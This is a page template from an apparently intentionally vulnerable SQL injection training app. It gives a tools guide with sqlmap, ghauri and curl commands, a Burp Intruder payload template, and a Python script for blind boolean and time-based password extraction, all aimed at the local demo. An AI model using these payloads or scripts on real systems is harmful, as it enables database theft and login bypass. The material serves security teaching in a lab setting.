<?php if ( ! defined('SQL_INJECTION_IN_PHP') ) die('Direct access not permitted'); ?>

<nav aria-label="breadcrumb" class="mb-3">
  <ol class="breadcrumb">
    <li class="breadcrumb-item"><a href="?action=walkthroughs">Walkthroughs</a></li>
    <li class="breadcrumb-item active">Tools Guide</li>
  </ol>
</nav>

<h2 class="mb-1">SQL Injection Testing Tools</h2>
<p class="text-muted mb-4">A practical guide to tools used during SQL injection assessment, with commands targeting this demo app.</p>

<!-- sqlmap -->
<div class="card mb-4">
  <div class="card-header bg-dark text-white d-flex justify-content-between">
    <strong>sqlmap — Automated SQL Injection Framework</strong>
    <a href="https://sqlmap.org" target="_blank" class="text-light small">sqlmap.org ↗</a>
  </div>
  <div class="card-body">
    <p>sqlmap is the most widely used open-source SQL injection tool. It automatically detects and exploits injection vulnerabilities, dumps databases, and includes tamper scripts for WAF bypass.</p>

    <h6 class="fw-bold mt-3">Installation</h6>
    <pre class="bg-light p-2 rounded small">pip install sqlmap
# or
git clone https://github.com/sqlmapproject/sqlmap.git</pre>

    <h6 class="fw-bold mt-3">Commands for This App</h6>
    <table class="table table-sm table-bordered">
      <thead class="table-dark"><tr><th>Target</th><th>Command</th></tr></thead>
      <tbody>
        <tr>
          <td>Login bypass (POST)</td>
          <td><pre class="mb-0 small">sqlmap -u "http://localhost:8080/db_login.php" \
  --data="email=test&password=test" \
  --dbs --batch --level=3</pre></td>
        </tr>
        <tr>
          <td>UNION injection (GET)</td>
          <td><pre class="mb-0 small">sqlmap -u "http://localhost:8080/profile.php?action=union_search&search=test" \
  --technique=U -D sql_demo --dump --batch</pre></td>
        </tr>
        <tr>
          <td>Error-based (GET)</td>
          <td><pre class="mb-0 small">sqlmap -u "http://localhost:8080/profile.php?action=error_based&uid=1" \
  --technique=E -D sql_demo -T user --dump --batch</pre></td>
        </tr>
        <tr>
          <td>Blind boolean (GET)</td>
          <td><pre class="mb-0 small">sqlmap -u "http://localhost:8080/profile.php?action=blind_boolean&uid=1" \
  --technique=B -D sql_demo -T user -C email,password --dump --batch --level=3</pre></td>
        </tr>
        <tr>
          <td>Time-based blind (GET)</td>
          <td><pre class="mb-0 small">sqlmap -u "http://localhost:8080/profile.php?action=time_based&uid=1" \
  --technique=T --dbms=mysql --level=3 --dump --batch</pre></td>
        </tr>
        <tr>
          <td>WAF bypass via tamper</td>
          <td><pre class="mb-0 small">sqlmap -u "http://localhost:8080/profile.php?action=waf_bypass&waf=1&search=test" \
  --tamper=space2comment,randomcase,between --dbs --batch</pre></td>
        </tr>
        <tr>
          <td>List all tables and columns</td>
          <td><pre class="mb-0 small">sqlmap -u "http://localhost:8080/profile.php?action=union_search&search=test" \
  -D sql_demo --tables --columns --batch</pre></td>
        </tr>
        <tr>
          <td>Dump specific table</td>
          <td><pre class="mb-0 small">sqlmap -u "http://localhost:8080/profile.php?action=union_search&search=test" \
  -D sql_demo -T secret --dump --batch</pre></td>
        </tr>
      </tbody>
    </table>

    <h6 class="fw-bold mt-3">Useful Flags</h6>
    <table class="table table-sm table-bordered small">
      <thead class="table-secondary"><tr><th>Flag</th><th>Meaning</th></tr></thead>
      <tbody>
        <tr><td><code>--technique=BESTU</code></td><td>B=boolean, E=error, S=stacked, T=time, U=union</td></tr>
        <tr><td><code>--level=1-5</code></td><td>Depth of tests. 3+ for headers/cookies</td></tr>
        <tr><td><code>--risk=1-3</code></td><td>Risk level — 3 includes UPDATE-based tests</td></tr>
        <tr><td><code>--batch</code></td><td>Non-interactive mode (auto-confirm)</td></tr>
        <tr><td><code>--dbs</code></td><td>Enumerate databases</td></tr>
        <tr><td><code>--tables</code></td><td>Enumerate tables in target DB</td></tr>
        <tr><td><code>--dump</code></td><td>Dump table data</td></tr>
        <tr><td><code>--tamper=</code></td><td>Apply obfuscation/WAF bypass scripts</td></tr>
        <tr><td><code>--cookie=</code></td><td>Pass session cookie for authenticated testing</td></tr>
        <tr><td><code>-p param</code></td><td>Specify which parameter to test</td></tr>
        <tr><td><code>--dbms=mysql</code></td><td>Skip DB fingerprinting, target MySQL directly</td></tr>
      </tbody>
    </table>
  </div>
</div>

<!-- Burp Suite -->
<div class="card mb-4">
  <div class="card-header bg-dark text-white d-flex justify-content-between">
    <strong>Burp Suite — HTTP Interception Proxy</strong>
    <a href="https://portswigger.net/burp/communitydownload" target="_blank" class="text-light small">Download Free ↗</a>
  </div>
  <div class="card-body">
    <p>Burp Suite Community Edition is free and sufficient for manual SQL injection testing. It lets you intercept, modify, and replay any HTTP request.</p>

    <h6 class="fw-bold mt-3">Workflow — Manual SQLi Testing</h6>
    <ol>
      <li>Configure your browser to proxy through <code>127.0.0.1:8080</code> (Burp's default listener)</li>
      <li>Visit the vulnerable page in your browser — Burp captures the request</li>
      <li>Right-click the request → <strong>Send to Repeater</strong></li>
      <li>In Repeater, modify the <code>search</code> or <code>uid</code> parameter value</li>
      <li>Click <strong>Send</strong> and observe the response</li>
      <li>Iterate with different payloads</li>
    </ol>

    <h6 class="fw-bold mt-3">Intruder — Automated Blind Boolean Brute-Force</h6>
    <ol>
      <li>Capture the blind_boolean request and send to <strong>Intruder</strong></li>
      <li>Set attack type to <strong>Cluster Bomb</strong></li>
      <li>Mark two positions: the character position <code>§1§</code> and the test character <code>§a§</code></li>
      <li>Set payload 1: numbers 1–32 (character position)</li>
      <li>Set payload 2: alphanumeric characters a-z, A-Z, 0-9</li>
      <li>Add a grep match for <code>User found</code> to flag true responses</li>
      <li>Payload template: <code>1 AND substring((SELECT password FROM user WHERE id=8),§1§,1)='§a§'</code></li>
    </ol>

    <h6 class="fw-bold mt-3">Scanner (Pro only)</h6>
    <p class="small mb-0">Burp Suite Professional includes an active scanner that automatically detects SQL injection vulnerabilities. Right-click any request → <strong>Do active scan</strong>.</p>
  </div>
</div>

<!-- curl + Python -->
<div class="card mb-4">
  <div class="card-header bg-dark text-white"><strong>curl & Python requests — Manual Scripting</strong></div>
  <div class="card-body">
    <h6 class="fw-bold">curl — Quick payload testing</h6>
    <pre class="bg-light p-2 rounded small"># Test error-based injection
curl -s -g "http://localhost:8080/profile.php?action=error_based&uid=1+AND+extractvalue(1,concat(0x7e,(SELECT+version())))"

# Test UNION injection
curl -s -g "http://localhost:8080/profile.php?action=union_search&search=%25'+UNION+SELECT+id,name,filepath,1,1,1,1+FROM+secret--+"

# POST login bypass
curl -s -X POST http://localhost:8080/db_login.php \
  -d "email='+OR+'1'%3d'1'--+&password=x" -v</pre>

    <h6 class="fw-bold mt-3">Python — Blind injection automation (copy-ready)</h6>
    <pre class="bg-light p-2 rounded small">import requests, string, time

BASE   = "http://localhost:8080/profile.php"
CHARS  = string.ascii_letters + string.digits + "!@#$"

# ── Boolean-based extraction ──────────────────────────────────────────────────
def bool_extract(query, max_len=40):
    result = ""
    for pos in range(1, max_len + 1):
        for ch in CHARS:
            p = f"8 AND substring(({query}),{pos},1)='{ch}'"
            r = requests.get(BASE, params={"action": "blind_boolean", "uid": p})
            if "User found" in r.text:
                result += ch; break
        else:
            break
    return result

# ── Time-based extraction ─────────────────────────────────────────────────────
def time_extract(query, max_len=40, sleep=3, threshold=2.5):
    result = ""
    for pos in range(1, max_len + 1):
        for ch in CHARS:
            p = f"1 AND IF(substring(({query}),{pos},1)='{ch}',SLEEP({sleep}),0)"
            t0 = time.time()
            requests.get(BASE, params={"action": "time_based", "uid": p}, timeout=10)
            if time.time() - t0 >= threshold:
                result += ch; break
        else:
            break
    return result

print("DB (bool):", bool_extract("SELECT database()"))
print("Pass (time):", time_extract("SELECT password FROM user WHERE id=8"))</pre>
  </div>
</div>

<!-- ghauri -->
<div class="card mb-4">
  <div class="card-header bg-dark text-white d-flex justify-content-between">
    <strong>ghauri — Modern sqlmap Alternative</strong>
    <a href="https://github.com/r0oth3x49/ghauri" target="_blank" class="text-light small">GitHub ↗</a>
  </div>
  <div class="card-body">
    <p>ghauri is a newer, actively maintained SQL injection tool with better WAF bypass capabilities and cleaner output than sqlmap.</p>
    <pre class="bg-light p-2 rounded small">pip install ghauri

ghauri -u "http://localhost:8080/profile.php?action=union_search&search=test" \
  --dbs --batch

ghauri -u "http://localhost:8080/profile.php?action=error_based&uid=1" \
  --technique=error -D sql_demo -T user --dump --batch</pre>
  </div>
</div>

<!-- OWASP ZAP -->
<div class="card mb-4">
  <div class="card-header bg-dark text-white d-flex justify-content-between">
    <strong>OWASP ZAP — Free Web Application Scanner</strong>
    <a href="https://www.zaproxy.org" target="_blank" class="text-light small">zaproxy.org ↗</a>
  </div>
  <div class="card-body">
    <p>OWASP ZAP (Zed Attack Proxy) is a free alternative to Burp Suite with built-in active scanning for SQL injection and other vulnerabilities.</p>
    <ol class="small mb-0">
      <li>Set browser proxy to <code>127.0.0.1:8090</code></li>
      <li>Browse the vulnerable pages — ZAP builds a site map</li>
      <li>Right-click the target URL → <strong>Active Scan</strong></li>
      <li>ZAP will automatically probe for SQLi, XSS, and other vulns</li>
      <li>Review findings in the <strong>Alerts</strong> tab</li>
    </ol>
  </div>
</div>

<!-- Summary Table -->
<div class="card">
  <div class="card-header bg-secondary text-white"><strong>Quick Reference — Tool Selection</strong></div>
  <div class="card-body p-0">
    <table class="table table-sm table-striped table-bordered mb-0">
      <thead class="table-dark">
        <tr><th>Scenario</th><th>Best Tool</th></tr>
      </thead>
      <tbody>
        <tr><td>Quick automated detection + dump</td><td>sqlmap</td></tr>
        <tr><td>Manual payload crafting and testing</td><td>Burp Suite (Repeater)</td></tr>
        <tr><td>Automated blind boolean brute-force</td><td>Burp Intruder / Python script</td></tr>
        <tr><td>Time-based extraction automation</td><td>sqlmap with <code>--technique=T</code></td></tr>
        <tr><td>WAF bypass testing</td><td>sqlmap + tamper scripts / ghauri</td></tr>
        <tr><td>Full app scan (beginners)</td><td>OWASP ZAP active scan</td></tr>
        <tr><td>Custom automation / CTF scripting</td><td>Python requests library</td></tr>
      </tbody>
    </table>
  </div>
</div>
